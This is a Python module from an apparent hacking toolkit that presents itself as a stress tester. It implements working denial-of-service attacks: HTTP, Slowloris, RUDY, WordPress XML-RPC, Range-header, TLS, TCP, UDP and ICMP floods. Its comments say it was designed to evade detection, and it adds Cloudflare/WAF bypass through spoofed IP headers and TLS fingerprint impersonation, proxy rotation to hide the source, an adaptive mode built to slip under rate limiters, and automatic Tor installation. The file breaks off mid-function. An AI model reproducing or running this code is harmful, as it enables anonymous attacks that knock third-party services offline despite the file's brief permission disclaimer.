# -*- coding: utf-8 -*-
"""
MEOW-SEC :: STRESS — Load & Stress Testing
  · L7 HTTP  (GET, POST, HEAD, BYPASS, SLOWLORIS, RUDY, JSON, COOKIE, XMLRPC, RANGE, TLS, MIXED)
  · L4 TCP   (connection flood, SOCKS proxy support)
  · L4 UDP   (packet flood)
  · ICMP     (subprocess ping flood)
  · Proxy rotation intégrée sur TOUTES les méthodes
  Use ONLY on systems you own or have explicit written permission to test.
"""
import os, sys, time, socket, threading, random, string, ssl, struct
import concurrent.futures
from datetime import datetime
from urllib.parse import urlparse

from core.ui import (console, show_module_banner, ok, err, info, warn, find,
                     ask_choice, G1, G2, CY, OR, RD, DM)
from core.cats import cat_talk, CAT_SCAN, CAT_HACKER
from rich.panel   import Panel
from rich.table   import Table
from rich.text    import Text
from rich.align   import Align
from rich.prompt  import Prompt, IntPrompt, Confirm
from rich.live    import Live
from rich.layout  import Layout
from rich         import box
from rich.rule    import Rule

try:
    import requests as _req
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    import socks as _socks
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False

# curl_cffi — browser TLS fingerprint impersonation (bypass Cloudflare JA3 detection)
try:
    from curl_cffi import requests as _cffi_req
    HAS_CFFI = True
except ImportError:
    HAS_CFFI = False

# Navigateurs supportés par curl_cffi pour l'impersonation
_CFFI_BROWSERS = ["chrome110", "chrome107", "chrome104", "chrome101",
                  "chrome100", "chrome99", "firefox102", "firefox100",
                  "edge101", "safari15_3", "safari15_5"]

# ─── STAT BLOCK ──────────────────────────────────────────────

class Stats:
    def __init__(self):
        self._lock      = threading.Lock()
        self.sent       = 0
        self.ok         = 0
        self.fail       = 0
        self.bytes_sent = 0
        self.latencies  = []
        self.start      = time.time()

    def hit(self, success: bool, latency_ms: float = 0, nbytes: int = 0):
        with self._lock:
            self.sent += 1
            if success: self.ok += 1
            else:        self.fail += 1
            if latency_ms > 0: self.latencies.append(latency_ms)
            self.bytes_sent += nbytes

    @property
    def elapsed(self) -> float:
        return max(time.time() - self.start, 0.001)

    @property
    def rps(self) -> float:
        return self.sent / self.elapsed

    @property
    def avg_ms(self) -> float:
        if not self.latencies: return 0.0
        return sum(self.latencies) / len(self.latencies)

    def render_table(self, target: str, method: str, running: bool) -> Table:
        t = Table(box=box.MINIMAL_DOUBLE_HEAD, border_style=G2,
                  header_style=CY, show_lines=False, expand=True)
        t.add_column("Metric",  style=CY, width=18)
        t.add_column("Value",   style=G1)

        status = f"[bold {G1}]● RUNNING[/]" if running else f"[bold {OR}]■ STOPPED[/]"
        t.add_row("Target",     target)
        t.add_row("Method",     f"[bold {OR}]{method}[/]")
        t.add_row("Status",     status)
        t.add_row("Elapsed",    f"{self.elapsed:.1f}s")
        t.add_row("Requests",   f"[bold {G1}]{self.sent:,}[/]")
        t.add_row("Success",    f"[{G1}]{self.ok:,}[/]")
        t.add_row("Failed",     f"[{RD}]{self.fail:,}[/]")
        t.add_row("RPS",        f"[bold {G1}]{self.rps:,.1f}[/]")
        t.add_row("Avg latency",f"{self.avg_ms:.1f} ms")
        t.add_row("Data sent",  _fmt_bytes(self.bytes_sent))
        return t

def _fmt_bytes(n: int) -> str:
    if n < 1024:      return f"{n} B"
    if n < 1048576:   return f"{n/1024:.1f} KB"
    return                  f"{n/1048576:.2f} MB"

# ─── STOP FLAG ───────────────────────────────────────────────

_STOP = threading.Event()

# ─── SESSION FACTORY (curl_cffi si dispo → bypass JA3/Cloudflare) ──────────

def _make_session(use_cffi: bool = False):
    """
    Retourne une session HTTP.
    Si curl_cffi est dispo et use_cffi=True : impersonation Chrome → bypass Cloudflare JA3.
    Sinon : requests standard.
    """
    if use_cffi and HAS_CFFI:
        browser = random.choice(_CFFI_BROWSERS)
        return _cffi_req.Session(impersonate=browser)
    return _req.Session()

# ─── PROXY HEALTHCHECK ───────────────────────────────────────

def _proxy_healthcheck(target_url: str, sample: int = 40, timeout: int = 4) -> int:
    """
    Vérifie rapidement les proxies du pool avant une attaque.
    Teste `sample` proxies en parallèle contre target_url.
    Marque les morts comme bad. Retourne le nombre de proxies vivants.
    """
    try:
        from core.proxy_manager import get_manager
        mgr = get_manager()
    except Exception:
        return 0

    pool = mgr.good
    if not pool:
        warn("Proxy pool vide — lance PROXYCAT pour télécharger des proxies.")
        return 0

    # Prendre un échantillon representatif (top rapides + quelques du milieu)
    top_n = min(sample, len(pool))
    candidates = pool[:top_n]

    alive_count = 0
    dead_count  = 0
    lock = threading.Lock()

    console.print()
    info(f"Proxy checkup — testing [{G1}]{top_n}[/] proxies ({timeout}s timeout)...")

    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, MofNCompleteColumn
    with Progress(
        SpinnerColumn(style=G1),
        TextColumn(f"[{G1}]Checking proxies"),
        BarColumn(bar_width=35, style=G2, complete_style=G1),
        MofNCompleteColumn(),
        console=console, transient=True
    ) as prog:
        task = prog.add_task("", total=top_n)

        def _test(entry):
            nonlocal alive_count, dead_count
            proxy_str = entry["proxy"]
            if proxy_str.startswith("socks5://") or proxy_str.startswith("socks4://"):
                pdict = {"http": proxy_str, "https": proxy_str}
            else:
                pdict = {"http": f"http://{proxy_str}", "https": f"http://{proxy_str}"}
            try:
                r = _req.get(target_url, proxies=pdict, timeout=timeout,
                             verify=False, allow_redirects=False,
                             headers={"User-Agent": "MEOW-CHECK/1.1"})
                ok_flag = r.status_code < 600
            except Exception:
                ok_flag = False
            with lock:
                if ok_flag:
                    alive_count += 1
                else:
                    dead_count += 1
                    mgr.mark_bad(proxy_str)
            prog.advance(task)

        with concurrent.futures.ThreadPoolExecutor(max_workers=min(top_n, 60)) as pool_exec:
            list(pool_exec.map(_test, candidates))

    total_alive = len([p for p in mgr.good if p["proxy"] not in mgr.bad])
    if total_alive >= 5:
        ok(f"Proxy pool: [{G1}]{total_alive}[/] vivants / {dead_count} morts dans l'échantillon")
    elif total_alive > 0:
        warn(f"Seulement [{OR}]{total_alive}[/] proxies vivants — relance PROXYCAT pour refresh")
    else:
        err("Aucun proxy vivant — attaque sans proxy ou relance PROXYCAT")
    console.print()
    return total_alive


# ─── PROXY HELPERS ───────────────────────────────────────────

def _get_proxy() -> dict | None:
    """Retourne un proxy dict HTTP/SOCKS pour requests"""
    try:
        from core.proxy_manager import get_manager
        return get_manager().get_dict()
    except Exception:
        return None

def _get_socks_proxy() -> tuple | None:
    """
    Retourne (scheme, host, port) pour un proxy SOCKS ou HTTP.
    Utilisé pour les connexions raw socket (TCP, SLOWLORIS, RUDY).
    """
    try:
        from core.proxy_manager import get_manager
        proxy_str = get_manager().get()
        if not proxy_str:
            return None
        if proxy_str.startswith("socks5://"):
            h, p = proxy_str.replace("socks5://","").split(":")
            return ("socks5", h, int(p))
        if proxy_str.startswith("socks4://"):
            h, p = proxy_str.replace("socks4://","").split(":")
            return ("socks4", h, int(p))
        # plain HTTP proxy — split host:port
        addr = proxy_str.replace("http://","")
        h, p = addr.split(":")
        return ("http", h, int(p))
    except Exception:
        return None

def _socks_connect(host: str, port: int) -> socket.socket | None:
    """Ouvre une connexion TCP via proxy SOCKS si disponible, sinon directe"""
    proxy = _get_socks_proxy()
    if proxy and HAS_SOCKS:
        scheme, ph, pp = proxy
        try:
            s = _socks.socksocket()
            if scheme == "socks5":
                s.set_proxy(_socks.SOCKS5, ph, pp)
            elif scheme == "socks4":
                s.set_proxy(_socks.SOCKS4, ph, pp)
            else:
                s.set_proxy(_socks.HTTP, ph, pp)
            s.settimeout(6)
            s.connect((host, port))
            return s
        except Exception:
            pass
    # fallback direct
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(6)
    try:
        s.connect((host, port))
        return s
    except Exception:
        return None

# ─── L7 HTTP GET ─────────────────────────────────────────────

def _worker_http_get(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    session = _req.Session()
    while not _STOP.is_set():
        headers = {"User-Agent": random.choice(ua_list),
                   "Accept": "*/*", "Cache-Control": "no-cache"}
        t0 = time.perf_counter()
        try:
            r = session.get(url, headers=headers,
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(200 <= r.status_code < 500, lat, len(r.content))
        except Exception:
            stats.hit(False)

# ─── L7 HTTP POST ────────────────────────────────────────────

def _worker_http_post(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    session = _req.Session()
    while not _STOP.is_set():
        headers = {"User-Agent": random.choice(ua_list),
                   "Content-Type": "application/x-www-form-urlencoded"}
        body = _rand_str(random.randint(64, 512)).encode()
        t0 = time.perf_counter()
        try:
            r = session.post(url, data=body, headers=headers,
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(200 <= r.status_code < 500, lat, len(body))
        except Exception:
            stats.hit(False)

# ─── L7 HTTP HEAD ────────────────────────────────────────────

def _worker_http_head(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    session = _req.Session()
    while not _STOP.is_set():
        headers = {"User-Agent": random.choice(ua_list)}
        t0 = time.perf_counter()
        try:
            r = session.head(url + f"?{_rand_str(6)}={_rand_str(8)}",
                             headers=headers,
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat)
        except Exception:
            stats.hit(False)

# ─── L7 BYPASS (CF/WAF evasion) ──────────────────────────────

def _bypass_headers(ua_list: list) -> dict:
    fake_ip  = ".".join(str(random.randint(1,254)) for _ in range(4))
    referrers = [
        "https://www.google.com/", "https://www.bing.com/",
        "https://t.co/", "https://www.reddit.com/", "https://duckduckgo.com/",
    ]
    return {
        "User-Agent":       random.choice(ua_list),
        "X-Forwarded-For":  fake_ip,
        "X-Real-IP":        fake_ip,
        "CF-Connecting-IP": fake_ip,
        "True-Client-IP":   fake_ip,
        "X-Originating-IP": fake_ip,
        "Referer":          random.choice(referrers),
        "Cache-Control":    "no-cache, no-store",
        "Pragma":           "no-cache",
        "Accept":           "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language":  "en-US,en;q=0.5",
        "Accept-Encoding":  "gzip, deflate",
        "Connection":       "keep-alive",
        "DNT":              "1",
    }

def _worker_http_bypass(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    session = _req.Session()
    while not _STOP.is_set():
        cache_buster = f"?_={int(time.time()*1000)}&cb={_rand_str(8)}"
        headers = _bypass_headers(ua_list)
        t0 = time.perf_counter()
        try:
            r = session.get(url + cache_buster, headers=headers,
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(r.content))
        except Exception:
            stats.hit(False)

# ─── L7 SLOWLORIS ────────────────────────────────────────────

def _worker_slowloris(host: str, port: int, stats: Stats, use_proxy: bool):
    """Connexions partielles — proxy SOCKS si disponible"""
    sockets = []
    while not _STOP.is_set():
        try:
            s = _socks_connect(host, port) if use_proxy else None
            if s is None:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
            s.send(f"GET /?{_rand_str(8)} HTTP/1.1\r\nHost: {host}\r\n".encode())
            sockets.append(s)
            stats.hit(True, nbytes=64)
        except Exception:
            stats.hit(False)

        dead = []
        for s in sockets:
            try:
                s.send(f"X-a: {random.randint(1,5000)}\r\n".encode())
            except Exception:
                dead.append(s)
        for s in dead:
            try: s.close()
            except: pass
            sockets.remove(s)
        time.sleep(random.uniform(0.5, 1.5))

    for s in sockets:
        try: s.close()
        except: pass

# ─── L7 RUDY ─────────────────────────────────────────────────

def _worker_rudy(host: str, port: int, path: str, stats: Stats, use_proxy: bool):
    """Slow POST body — proxy SOCKS si disponible"""
    while not _STOP.is_set():
        try:
            s = _socks_connect(host, port) if use_proxy else None
            if s is None:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(30)
                s.connect((host, port))
            body_len = random.randint(100000, 999999)
            ua = random.choice(UA_LIST)
            req = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"User-Agent: {ua}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {body_len}\r\n"
                f"Connection: keep-alive\r\n\r\n"
            )
            s.send(req.encode())
            stats.hit(True, nbytes=len(req))
            sent = 0
            while sent < body_len and not _STOP.is_set():
                s.send(_rand_str(1).encode())
                sent += 1
                stats.hit(True, nbytes=1)
                time.sleep(random.uniform(0.05, 0.2))
            s.close()
        except Exception:
            stats.hit(False)
            time.sleep(0.5)

# ─── L7 JSON FLOOD ───────────────────────────────────────────

def _worker_http_json(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    """POST avec body JSON aléatoire — APIs / REST endpoints"""
    session = _req.Session()
    while not _STOP.is_set():
        import json as _json
        payload = _json.dumps({
            _rand_str(6): _rand_str(random.randint(8,64)),
            "id":  random.randint(1, 999999),
            "ts":  int(time.time()),
            "token": _rand_str(32),
        })
        headers = {
            "User-Agent":   random.choice(ua_list),
            "Content-Type": "application/json",
            "Accept":       "application/json",
            "X-Requested-With": "XMLHttpRequest",
        }
        t0 = time.perf_counter()
        try:
            r = session.post(url, data=payload.encode(), headers=headers,
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(payload))
        except Exception:
            stats.hit(False)

# ─── L7 COOKIE FLOOD ─────────────────────────────────────────

def _worker_http_cookie(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    """Envoie des headers Cookie massifs — épuise les parsers / session stores"""
    session = _req.Session()
    while not _STOP.is_set():
        # Génère 50-100 cookies aléatoires
        cookies = "; ".join(f"{_rand_str(8)}={_rand_str(16)}"
                            for _ in range(random.randint(50, 100)))
        headers = {
            "User-Agent": random.choice(ua_list),
            "Cookie":     cookies,
            "Accept":     "*/*",
        }
        t0 = time.perf_counter()
        try:
            r = session.get(url, headers=headers,
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(cookies))
        except Exception:
            stats.hit(False)

# ─── L7 XMLRPC (WordPress) ───────────────────────────────────

def _worker_xmlrpc(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    """
    Flood xmlrpc.php — chaque requête déclenche des centaines d'auth
    si multicall est activé (WordPress pre-6.x).
    """
    parsed = urlparse(url)
    xmlrpc_url = f"{parsed.scheme}://{parsed.netloc}/xmlrpc.php"
    payload = """<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params><param><value><array><data>
""" + "".join(f"""<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>admin</string></value>
<value><string>{_rand_str(8)}</string></value>
</data></array></value></member>
</struct></value>
""" for _ in range(100)) + """</data></array></value></param></params>
</methodCall>"""

    session = _req.Session()
    while not _STOP.is_set():
        headers = {
            "User-Agent":   random.choice(ua_list),
            "Content-Type": "text/xml",
            "Content-Length": str(len(payload)),
        }
        t0 = time.perf_counter()
        try:
            r = session.post(xmlrpc_url, data=payload.encode(), headers=headers,
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=12, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(payload))
        except Exception:
            stats.hit(False)

# ─── L7 RANGE FLOOD ──────────────────────────────────────────

def _worker_http_range(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    """
    HTTP Range header abuse — force le serveur à parser des ranges complexes.
    Efficace contre certains serveurs non-patchés (CVE-2011-3192 style).
    """
    session = _req.Session()
    while not _STOP.is_set():
        # Génère 50-150 ranges aléatoires
        ranges = ",".join(
            f"{random.randint(0,9999999)}-{random.randint(0,9999999)}"
            for _ in range(random.randint(50, 150))
        )
        headers = {
            "User-Agent":    random.choice(ua_list),
            "Range":         f"bytes={ranges}",
            "Request-Range": f"bytes={ranges}",
            "Accept":        "*/*",
        }
        t0 = time.perf_counter()
        try:
            r = session.get(url, headers=headers,
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat)
        except Exception:
            stats.hit(False)

# ─── L7 TLS HANDSHAKE FLOOD ──────────────────────────────────

def _worker_tls(host: str, port: int, stats: Stats, use_proxy: bool):
    """
    TLS handshake flood — chaque connexion SSL coûte ~10× plus de CPU côté serveur.
    Proxy SOCKS si disponible pour masquer la source.
    """
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE
    while not _STOP.is_set():
        t0 = time.perf_counter()
        try:
            raw = _socks_connect(host, port) if use_proxy else None
            if raw is None:
                raw = socket.create_connection((host, port), timeout=5)
            conn = ctx.wrap_socket(raw, server_hostname=host)
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(True, lat)
            conn.close()
        except Exception:
            stats.hit(False)

# ─── L7 MIXED (rotation aléatoire) ───────────────────────────

def _worker_http_mixed(url: str, stats: Stats, use_proxy: bool, ua_list: list):
    """Alterne GET/POST/HEAD/BYPASS aléatoirement — harder to fingerprint / rate-limit"""
    session = _req.Session()
    methods_list = [
        lambda: session.get(url + f"?{_rand_str(6)}",
                            headers={"User-Agent": random.choice(ua_list)},
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False),
        lambda: session.post(url,
                             data=_rand_str(random.randint(32,256)).encode(),
                             headers={"User-Agent": random.choice(ua_list),
                                      "Content-Type": "application/x-www-form-urlencoded"},
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=10, allow_redirects=False, verify=False),
        lambda: session.head(url + f"?{_rand_str(4)}={_rand_str(6)}",
                             headers={"User-Agent": random.choice(ua_list)},
                             proxies=_get_proxy() if use_proxy else None,
                             timeout=10, allow_redirects=False, verify=False),
        lambda: session.get(url + f"?_={int(time.time()*1000)}",
                            headers=_bypass_headers(ua_list),
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=10, allow_redirects=False, verify=False),
    ]
    while not _STOP.is_set():
        t0 = time.perf_counter()
        try:
            r = random.choice(methods_list)()
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(r.status_code < 500, lat, len(getattr(r, 'content', b'')))
        except Exception:
            stats.hit(False)

# ─── RESONANCE — ADAPTIVE WORKER SATURATION ──────────────────
#
#  Basé sur la loi de Little : L = λW
#    L = workers occupés, λ = req/s envoyées, W = temps de réponse
#
#  Principe : au lieu d'envoyer MAX requêtes (flood naïf), on envoie
#  EXACTEMENT assez pour que 100% des workers du serveur soient
#  perpétuellement occupés, sans jamais créer de file d'attente.
#
#  Avantage :
#  - Rate-limiters ne se déclenchent pas (taux de req/s FAIBLE)
#  - Logs ressemblent à du trafic normal
#  - Utilisation serveur : 100% — même effet qu'une attaque 10× plus grande
#  - CPU attaquant : quasi nul (on dort entre chaque requête)
#
#  Adaptation en temps réel : si le serveur ralentit (charge), on réduit
#  notre intervalle proportionnellement → on reste TOUJOURS au point de
#  résonance, jamais au-dessus (pas de file), jamais en-dessous (max charge)
#
class _ResonanceTimer:
    """
    Gestionnaire d'intervalle adaptatif partagé entre tous les workers.
    Implémente Little's Law pour maintenir λ = L/W en permanence.
    """
    def __init__(self, initial_latency_s: float, worker_count: int):
        self._lock       = threading.Lock()
        self._samples    = []
        self._workers    = worker_count
        # Intervalle initial : chaque worker attend W secondes entre requêtes
        # → λ total = workers / W = exactement ce qu'il faut pour L=workers
        self._interval   = max(0.02, initial_latency_s)
        self._last_adapt = time.time()
        self._gen         = 0          # génération courante (pour les logs)

    def report(self, latency_s: float, success: bool):
        """Worker appelle ça après chaque requête."""
        with self._lock:
            if success and 0.001 < latency_s < 30:
                self._samples.append(latency_s)

            # Ré-adaptation toutes les 3 secondes ou 30 samples
            now = time.time()
            if (now - self._last_adapt >= 3.0) and len(self._samples) >= 10:
                import statistics
                # P75 — pas la médiane : on veut charger, pas être conservateur
                p75 = statistics.quantiles(self._samples[-40:], n=4)[2]

                # Loi de Little inversée :
                # interval_par_worker = p75 * (1 - epsilon)
                # epsilon = 0.03 → on est à 97% de la capacité, jamais 100%
                # (évite de déclencher les timeouts du serveur)
                new_interval = max(0.015, p75 * 0.97)

                # Lissage exponentiel : 70% ancien, 30% nouveau
                self._interval = self._interval * 0.70 + new_interval * 0.30
                self._samples  = self._samples[-40:]
                self._last_adapt = now
                self._gen += 1

    @property
    def interval(self) -> float:
        return self._interval

    @property
    def generation(self) -> int:
        return self._gen


def _calibrate_resonance(url: str, use_proxy: bool, n: int = 6) -> float:
    """
    Phase de calibration : mesure le temps de réponse baseline.
    Lance N requêtes rapides, retourne le P75.
    """
    import statistics as _st
    latencies = []
    session = _req.Session()
    info(f"Calibrating frequency ({n} probes, 8s timeout each)...")

    for i in range(n):
        t0 = time.perf_counter()
        try:
            r = session.get(url, timeout=8, verify=False,
                            proxies=_get_proxy() if use_proxy else None,
                            headers={"User-Agent": random.choice(UA_LIST),
                                     "Cache-Control": "no-cache"},
                            allow_redirects=False)
            lat = time.perf_counter() - t0
            latencies.append(lat)
            info(f"  probe {i+1}/{n}  [{G1}]{lat*1000:.0f}ms[/]  HTTP {r.status_code}")
        except Exception:
            latencies.append(4.0)
            warn(f"  probe {i+1}/{n}  timeout/error — using 4s fallback")
        time.sleep(0.15)

    if not latencies:
        return 1.0

    p75 = _st.quantiles(latencies, n=4)[2]
    median = _st.median(latencies)
    find(f"Median={median*1000:.0f}ms  P75={p75*1000:.0f}ms  → interval=[{G1}]{p75*0.97*1000:.0f}ms[/]")
    return max(0.05, p75)


def _worker_resonance(url: str, stats: Stats, use_proxy: bool,
                      ua_list: list, timer: _ResonanceTimer):
    """
    Worker RESONANCE — s'endort exactement assez longtemps entre chaque
    requête pour maintenir le serveur à 100% de charge sans débordement.
    """
    session = _req.Session()

    while not _STOP.is_set():
        interval = timer.interval

        t0 = time.perf_counter()
        try:
            headers = {
                "User-Agent":      random.choice(ua_list),
                "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate",
                "Cache-Control":   "no-cache",
                "Pragma":          "no-cache",
                "Connection":      "keep-alive",
                "X-Request-ID":    _rand_str(16),
            }
            r = session.get(url, headers=headers,
                            proxies=_get_proxy() if use_proxy else None,
                            timeout=8, allow_redirects=False, verify=False)
            elapsed = time.perf_counter() - t0
            success = 200 <= r.status_code < 500
            stats.hit(success, elapsed * 1000, len(r.content))
            timer.report(elapsed, success)
            sleep_t = max(0.0, interval - elapsed)
            if sleep_t > 0:
                time.sleep(sleep_t)

        except Exception:
            stats.hit(False)
            timer.report(1.5, False)
            # Pas de sleep supplémentaire — la requête a déjà pris son temps


def _resonance_stats_extra(timer: _ResonanceTimer) -> str:
    """Ligne de stats supplémentaire pour le panel live."""
    return (f"[{CY}]Resonance interval:[/] [{G1}]{timer.interval*1000:.1f}ms[/]  "
            f"[{CY}]Adaptations:[/] [{G1}]{timer.generation}[/]")


# ─── PULSAR — Synchronized Burst Wave ────────────────────

def _worker_pulsar(url: str, stats: Stats, use_proxy: bool,
                   ua_list: list, barrier: threading.Barrier,
                   sleep_ref: list, use_cffi: bool = False):
    """
    PULSAR — Vague de choc synchronisée.
    Tous les workers se synchronisent via Barrier puis tirent en même temps.
    Sature le pool accept() du serveur OS (128-512 slots) instantanément.
    stream=True : headers seulement, body abandonné immédiatement.
    Le serveur génère la réponse complète mais ne peut pas la livrer → waste.
    Si curl_cffi dispo : TLS fingerprint Chrome → bypass Cloudflare JA3.
    """
    while not _STOP.is_set():
        try:
            barrier.wait(timeout=4)
        except threading.BrokenBarrierError:
            return

        session = _make_session(use_cffi)
        r = None
        t0 = time.perf_counter()
        try:
            kwargs = dict(
                headers={
                    "User-Agent":      random.choice(ua_list),
                    "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.9",
                    "Cache-Control":   "no-cache, no-store",
                    "Pragma":          "no-cache",
                    "Connection":      "close",
                    "X-Request-ID":    _rand_str(16),
                },
                proxies=_get_proxy() if use_proxy else None,
                timeout=6,
                allow_redirects=False,
                verify=False,
            )
            if not use_cffi:
                kwargs["stream"] = True
            r = session.get(url, **kwargs)
            elapsed = time.perf_counter() - t0
            r.close()
            stats.hit(r.status_code < 500, elapsed * 1000, 0)
        except Exception:
            stats.hit(False)
        finally:
            if r is not None:
                try: r.close()
                except Exception: pass

        time.sleep(max(0.02, sleep_ref[0]))


# ─── L4 TCP ──────────────────────────────────────────────────

def _worker_tcp(host: str, port: int, stats: Stats, use_proxy: bool):
    """TCP connection flood — SOCKS proxy si disponible"""
    while not _STOP.is_set():
        t0 = time.perf_counter()
        try:
            s = _socks_connect(host, port) if use_proxy else None
            if s is None:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
            lat = (time.perf_counter() - t0) * 1000
            stats.hit(True, lat)
            s.close()
        except Exception:
            stats.hit(False)

# ─── L4 UDP ──────────────────────────────────────────────────

def _worker_udp(host: str, port: int, stats: Stats):
    """UDP packet flood — raw socket, pas de proxy possible sur UDP"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not _STOP.is_set():
        try:
            payload = os.urandom(random.randint(64, 1024))
            sock.sendto(payload, (host, port))
            stats.hit(True, nbytes=len(payload))
        except Exception:
            stats.hit(False)
    sock.close()

# ─── ICMP FLOOD ──────────────────────────────────────────────

def _worker_icmp(host: str, stats: Stats):
    """ICMP flood via subprocess"""
    import subprocess
    while not _STOP.is_set():
        try:
            cmd = ["ping", "-n", "1", "-w", "500", host] if os.name == "nt" \
                  else ["ping", "-c", "1", "-W", "1", host]
            r = subprocess.run(cmd, capture_output=True, timeout=3)
            stats.hit(r.returncode == 0)
        except Exception:
            stats.hit(False)

# ─── AUTO-INSTALL ANONYMISEURS ───────────────────────────────

import subprocess as _sp
import urllib.request as _ureq
import zipfile, tarfile, tempfile, stat as _stat_mod

def _pip_install(*pkgs):
    """Installe des packages pip silencieusement."""
    info(f"pip install {' '.join(pkgs)}...")
    try:
        _sp.run([sys.executable, "-m", "pip", "install", "--quiet", *pkgs],
                check=True, timeout=120)
        ok(f"Installé : {', '.join(pkgs)}")
        return True
    except Exception as e:
        warn(f"pip install échoué : {e}"); return False

def _wait_port(host, port, timeout=60, label="service"):
    """Attend qu'un port TCP soit ouvert (max timeout secondes)."""
    deadline = time.time() + timeout
    info(f"Attente de {label} sur {host}:{port} (max {timeout}s)...")
    while time.time() < deadline:
        try:
            s = socket.socket(); s.settimeout(1)
            s.connect((host, port)); s.close(); return True
        except Exception:
            time.sleep(2)
    return False

def _detect_pkg_manager():
    """Retourne le gestionnaire de paquets système disponible ou None."""
    for mgr in ("apt-get", "apt", "dnf", "yum", "pacman", "brew"):
        if _sp.run(["which" if sys.platform != "win32" else "where", mgr],
                   capture_output=True).returncode == 0:
            return mgr
    return None

def _sys_install(pkg_map: dict):
    """
    pkg_map = {"apt-get": ["tor"], "brew": ["tor"], ...}
    Tente l'installation via le gestionnaire détecté.
    """
    mgr = _detect_pkg_manager()
    if not mgr:
        warn("Aucun gestionnaire de paquets trouvé."); return False
    pkgs = pkg_map.get(mgr, pkg_map.get("apt-get", []))
    if not pkgs:
        return False
    info(f"Installation via {mgr} : {' '.join(pkgs)}...")
    try:
        if mgr == "brew":
            _sp.run(["brew", "install", *pkgs], check=True, timeout=300)
        elif mgr == "pacman":
            _sp.run(["sudo", "pacman", "-S", "--noconfirm", *pkgs], check=True, timeout=300)
        else:
            _sp.run(["sudo", mgr, "install", "-y", *pkgs], check=True, timeout=300)
        ok(f"Installé via {mgr}.")
        return True
    except Exception as e:
        warn(f"Installation système échouée : {e}"); return False

def _start_tor_service():
    """Démarre le service Tor (Linux/macOS)."""
    if sys.platform == "win32":
        return
    mgr = _detect_pkg_manager()
    try:
        if mgr == "brew":
            _sp.Popen(["brew", "services", "start", "tor"],
                      stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
        else:
            # essai systemctl puis service
            if _sp.run(["sudo", "systemctl", "start", "tor"],
                       capture_output=True).returncode != 0:
                _sp.run(["sudo", "service", "tor", "start"], capture_output=True)
    except Exception:
        pass

def _download_tor_windows():
    """Télécharge et démarre le Tor Expert Bundle sur Windows."""
    # URL stable de l'archive Windows (sans GUI)
    base = "https://dist.torproject.org/torbrowser/"
    # On cherche la dernière version dans les redirects courants
    versions = ["14.0.7", "14.0.5", "14.0.3", "13.5.9", "13.5.7"]
    tmp = os.environ.get("TEMP", "C:\\Temp")
    tor_dir = os.path.join(tmp, "meow_tor")
    tor_exe = os.path.join(tor_dir, "tor", "tor.exe")

    if os.path.exists(tor_exe):
        info(f"Tor Expert Bundle trouvé : {tor_exe}")
        _launch_tor_windows(tor_exe, tor_dir)
        return os.path.exists(tor_exe)

    info("Téléchargement Tor Expert Bundle (Windows)...")
    os.makedirs(tor_dir, exist_ok=True)
    for ver in versions:
        url = f"{base}{ver}/tor-expert-bundle-windows-x86_64-{ver}.tar.gz"
        dest = os.path.join(tmp, "tor_expert.tar.gz")
        try:
            info(f"  Essai version {ver}...")
            _ureq.urlretrieve(url, dest)
            with tarfile.open(dest, "r:gz") as tf:
                tf.extractall(tor_dir)
